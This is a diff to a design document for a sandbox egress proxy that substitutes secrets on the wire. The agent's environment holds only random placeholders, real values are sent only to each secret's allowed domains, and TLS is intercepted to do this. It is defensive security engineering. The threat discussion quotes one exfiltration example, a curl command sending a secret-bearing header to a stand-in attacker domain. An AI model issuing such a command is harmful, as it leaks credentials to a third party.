@@ -35,11 +35,21 @@ path.
 - The mechanism is transparent to the default HTTPS client of every
   mainstream language (curl, Python, Node, Bun, Deno, Go, Java, Ruby, PHP,
   Rust with native-tls). No agent code changes required.
-- Failure modes are loud (TLS error, connection refused) rather than silent.
-  Specifically: a placeholder observed on a connection to a domain not in
-  that secret's `allowedDomains` causes dsbx to drop the connection, not
-  to forward the literal placeholder to a potentially attacker-controlled
-  upstream.
+- The real secret value is never forwarded to a destination outside the
+  matching secret's `allowedDomains`. This is the load-bearing security
+  invariant.
+- The placeholder itself is an opaque random nonce; whether it reaches a
+  given destination is not security-sensitive (it reveals nothing about
+  the secret's value, length, or name). On MITM-scoped domains where
+  dsbx observes a recognized placeholder going to a destination not in
+  that secret's `allowedDomains`, dsbx drops the connection (loud
+  failure on the surface where it can act). On non-MITM domains the
+  placeholder may be forwarded as-is - this is acceptable because no
+  real value is at risk.
+- Failure modes that *are* loud: TLS verification errors when the
+  agent's client doesn't trust dsbx's leaf, connection drops on
+  placeholder-to-disallowed, upstream auth errors when a transformed
+  placeholder fails to substitute and reaches upstream as garbage.
 
 ## Non-goals
 
@@ -131,20 +141,43 @@ domains are unaffected.
   cert for the SNI signed by the in-process CA. Terminate inbound TLS
   on dsbx with that leaf. Open outbound TLS toward the real upstream
   (still tunneled through the central egress proxy on 4443). On the
-  decrypted inner stream, run an HTTP/1.1 or HTTP/2 (selected by ALPN)
-  header/URL rewriter. Re-encrypt outbound.
+  decrypted inner stream, if the protocol parses as HTTP/1.1 or HTTP/2
+  (per ALPN), run the header/URL rewriter. If a recognized placeholder
+  appears on a non-allowed domain, drop. Otherwise re-encrypt outbound.
+  If the inner protocol is *not* HTTP/1.1 or HTTP/2 (e.g. Postgres TLS
+  on a MITM-scoped domain), the bytes are re-encrypted and forwarded
+  unchanged: dsbx doesn't substitute and doesn't scan for the
+  placeholder. Substitution requires HTTP framing; non-HTTP traffic on
+  a MITM-scoped domain is rare in practice and the worst case is the
+  agent forwarding a placeholder as garbage to an upstream that already
+  trusts the agent.
 - **Port 443, SNI not in allowlist union**: TCP-splice as today. No
-  TLS termination, no inspection.
+  TLS termination, no inspection. Placeholder-bearing requests to such
+  domains forward the placeholder unchanged - acceptable because the
+  placeholder is an opaque nonce.
 - **Port 80 (HTTP)**: Terminate TCP, run an HTTP/1.1 parser
-  (`httparse`), rewrite headers/URL, re-emit.
-- **Other ports (raw TCP)**: Pass through unchanged. If a placeholder
-  appears on a raw TCP connection, drop the connection (loud failure).
+  (`httparse`), scan for the placeholder. **Drop on match.** Never
+  substitute on plaintext HTTP - doing so would put the real secret on
+  the open internet between the central egress proxy and upstream.
+  Non-secret port-80 traffic continues to work.
+- **Other ports / raw TCP**: not addressed by this design. The central
+  egress proxy already denies non-HTTP/non-HTTPS connections from the
+  sandbox (it requires a domain extracted at dsbx peek time, and dsbx
+  only extracts domains for 80/443). Raw-TCP behavior, if ever needed,
+  is a separate design.
 
 Substitution is gated on a per-secret destination allowlist:
 
 ```
-secret.allowedDomains: string[]   // e.g. ["api.openai.com"]
+secret.allowedDomains: string[]   // e.g. ["api.openai.com", "*.googleapis.com"]
 ```
+
+Wildcards are supported following the same shape as the workspace egress
+policy: a leading `*.` matches any single-or-multi-label subdomain
+(`*.googleapis.com` matches `storage.googleapis.com` but not
+`googleapis.com` itself). Wildcard secrets broaden the MITM scope to
+whatever resolves under the wildcard - admins should pick the narrowest
+pattern that covers the use case.
 
 The substitution gate requires three things to agree on a domain in the
 secret's `allowedDomains`:
@@ -158,8 +191,11 @@ with the real value. If a recognized placeholder appears but the
 destination is **not** in the matching secret's `allowedDomains`, or the
 SNI/Host/`:authority:` disagree, dsbx **drops the connection** and
 records a structured deny-log event with the secret name, the SNI, and
-the disagreeing Host/authority. The literal placeholder is never
-forwarded to the upstream.
+the disagreeing Host/authority. (This drop applies on the MITM-scoped
+surface where dsbx terminates TLS and can see the placeholder. On
+non-MITM domains the placeholder may be forwarded as-is; that's
+acceptable per the goals because the placeholder is opaque and reveals
+nothing about the secret.)
 
 This is the security-critical control. It stops `curl
 https://attacker-allowlisted-by-egress-policy.com -H "X: $DST_FOO"`
@@ -398,7 +434,7 @@ Out of scope for Phase 0:
 - DB schema changes, model migrations, admin UI.
 - Changes to the existing `WorkspaceSandboxEnvVar` flow.
 - The random-nonce `__DST_SECRET_<32hex>__` format.
-- The `/etc/dust/egress-secrets.json` per-sandbox file.
+- The `/run/dust/egress-secrets.json` per-sandbox file.
 - CA persistence on tmpfs (Phase 0 regenerates on dsbx start; if
   `tools/index.ts` restarts dsbx mid-experiment the trust bundle goes
   stale - acceptable for a controlled smoke test, not for production).
@@ -444,9 +480,30 @@ with different semantics and different injection paths:
 2. **Secrets** (new). Sensitive values meant to be used in HTTPS
    requests only, scoped to a per-secret `allowedDomains` list. The
    agent env contains only the placeholder; the real value lives in
-   `/etc/dust/egress-secrets.json` (root, 0600) and is substituted
-   on the wire by dsbx when the destination domain matches the
-   secret's allowlist. Cannot be used offline (no real value in env).
+   `/run/dust/egress-secrets.json` (tmpfs, root-owned 0600) as
+   plaintext, and is substituted on the wire by dsbx when the
+   destination domain matches the secret's allowlist. Cannot be used
+   offline (no real value in env).
+
+   File schema (one record per secret):
+
+   ```json
+   [
+     {
+       "name": "DSEC_OPENAI_API_KEY",
+       "placeholder": "__DST_SECRET_<32hex>__",
+       "value": "sk-...",
+       "allowedDomains": ["api.openai.com"]
+     }
+   ]
+   ```
+
+   Storage rationale: plaintext on tmpfs, root-owned. Same posture as
+   the CA private key. dsbx needs the cleartext to substitute, so any
+   encryption layer would require a decryption key that lives somewhere
+   root-readable inside the sandbox VM anyway. Under the "agent UID
+   never escalates to root" invariant, root-only tmpfs is sufficient.
+   tmpfs is RAM-backed and never hits durable storage.
 
 Admins pick the class when creating the row. Migration path for
 existing rows: leave them as config vars by default; admins explicitly
@@ -459,25 +516,27 @@ time.
 - Random-nonce `__DST_SECRET_<32hex>__` placeholder. Each secret row has
   a 16-byte `placeholderNonce` column generated at create/rotate time.
 - **MITM scope = allowlist union**: dsbx terminates TLS only when the
-  SNI matches a domain in some configured secret's `allowedDomains`.
-  Other 443 traffic stays on the existing TCP-splice path. The allowlist
-  union is computed by `front` at sandbox boot and shipped in
-  `/etc/dust/egress-secrets.json`; dsbx loads it once on start.
+  SNI matches a domain in some configured secret's `allowedDomains`
+  (exact match or leading-`*.` wildcard). Other 443 traffic stays on
+  the existing TCP-splice path. The allowlist union is computed by
+  `front` at sandbox boot and shipped in
+  `/run/dust/egress-secrets.json`; dsbx loads it once on start.
 - **Substitution gate**: SNI + HTTP `Host:` (h1) + h2 `:authority:`
   must all agree on a domain in the matching secret's `allowedDomains`.
   On a recognized placeholder with disagreement (or destination not in
-  the secret's allowlist), dsbx drops the connection and emits a
-  structured deny-log event. The literal placeholder never reaches the
-  upstream.
+  the secret's allowlist), dsbx drops the connection on the MITM-scoped
+  surface and emits a structured deny-log event including the secret
+  name, SNI, and disagreeing Host/authority.
 - **CA persisted on tmpfs**: dsbx writes the per-sandbox-VM CA to
   `/run/dust/egress-ca.{pem,key}` on first start; reuses on restart.
   Key is root-owned 0600. Cert is root-owned 0644 so the boot script
   can install it into the system store.
 - `WorkspaceSandboxEnvVar` split into config vars and secrets (see
   above). Secrets gain `allowedDomains: string[]` and `placeholderNonce`.
-- `front` writes `/etc/dust/egress-secrets.json` (root, 0600) per
-  sandbox at boot, alongside the JWT. The file contains
-  `{ placeholder, encryptedValue, allowedDomains }[]`.
+- `front` writes `/run/dust/egress-secrets.json` (tmpfs, root-owned
+  0600) per sandbox at boot, alongside the JWT. The file is plaintext
+  with the schema documented above (`name`, `placeholder`, `value`,
+  `allowedDomains`).
 - `buildSandboxEnvVars` injects placeholders for secrets, real values
   for config vars.
 - Trust coverage: Node, Python (Requests + HTTPX, separately), Bun,
@@ -551,11 +610,29 @@ and validate it on h1 before adding frame-level complexity.
 - **Placeholder generator**: per-secret 16-byte random nonce stored on
   the row, not HMAC. Removes the "where does the workspace key live"
   question entirely. Unforgeable by construction. Rotation = new nonce.
-- **Loud failure on disallowed-placeholder**: dsbx **drops the
-  connection** when a recognized placeholder is observed but the
-  destination doesn't match the secret's `allowedDomains`, or when
-  SNI/Host/`:authority:` disagree. The literal placeholder is never
-  forwarded to the upstream. Logged with structured deny event.
+- **Security invariant**: the real secret value is never forwarded to a
+  destination outside the matching secret's `allowedDomains`. The
+  placeholder itself is an opaque random nonce - whether it leaks to
+  non-MITM destinations is not security-sensitive. On the MITM-scoped
+  surface where dsbx can act, recognized placeholders going to a
+  non-allowed destination drop the connection (loud failure where
+  possible). Earlier doc text claiming "literal placeholder is never
+  forwarded" was an overpromise and has been removed.
+- **Port 80 (plaintext HTTP)**: drop on placeholder, never substitute.
+  Substituting on plaintext would put the real secret on the open
+  internet between the central egress proxy and the upstream.
+- **Non-HTTP over MITM-scoped TLS** (e.g. Postgres TLS on a domain in
+  the allowlist union): pass through unchanged. dsbx doesn't substitute
+  (no HTTP framing to scan) and doesn't drop. Consistent with the
+  weakened "placeholder leak doesn't matter" framing; matches the
+  shipping cost we want for Phase 1.
+- **Raw TCP / non-80/443 ports**: not addressed by this design. The
+  central egress proxy already denies non-HTTP/non-HTTPS connections.
+  If raw-TCP egress is ever needed, it's a separate design.
+- **Wildcard support in `allowedDomains`**: yes, leading `*.`
+  (e.g. `*.googleapis.com`). Same shape as workspace egress policy.
+  Wildcard secrets broaden MITM scope to whatever resolves under the
+  pattern.
 - **MITM scope**: only the union of all configured secrets'
   `allowedDomains`. Other HTTPS traffic stays on the existing
   TCP-splice path. Cert-pinned and mTLS clients to non-secret domains
@@ -614,6 +691,12 @@ modes to users instead of flailing.
     placeholder is what's in env on purpose.
   - Use a secret only with its declared allowed domain. Cross-domain
     use will not substitute and the request fails loudly.
+  - For Rust HTTP clients, use `reqwest`'s default features (which
+    select `native-tls` and read the system trust store) or
+    `rustls-tls-native-roots`. Do **not** pick `rustls-tls`
+    (webpki-roots), it ships a hardcoded Mozilla bundle and won't
+    trust the per-sandbox CA. The failure is a clean TLS error, but
+    you'll spin trying to debug it - just switch features.
 - **Per-secret inline notes** in the prompt are deferred. Start with the
   hard list and the prefix convention; revisit if specific failure
   modes turn out to need stronger steering.
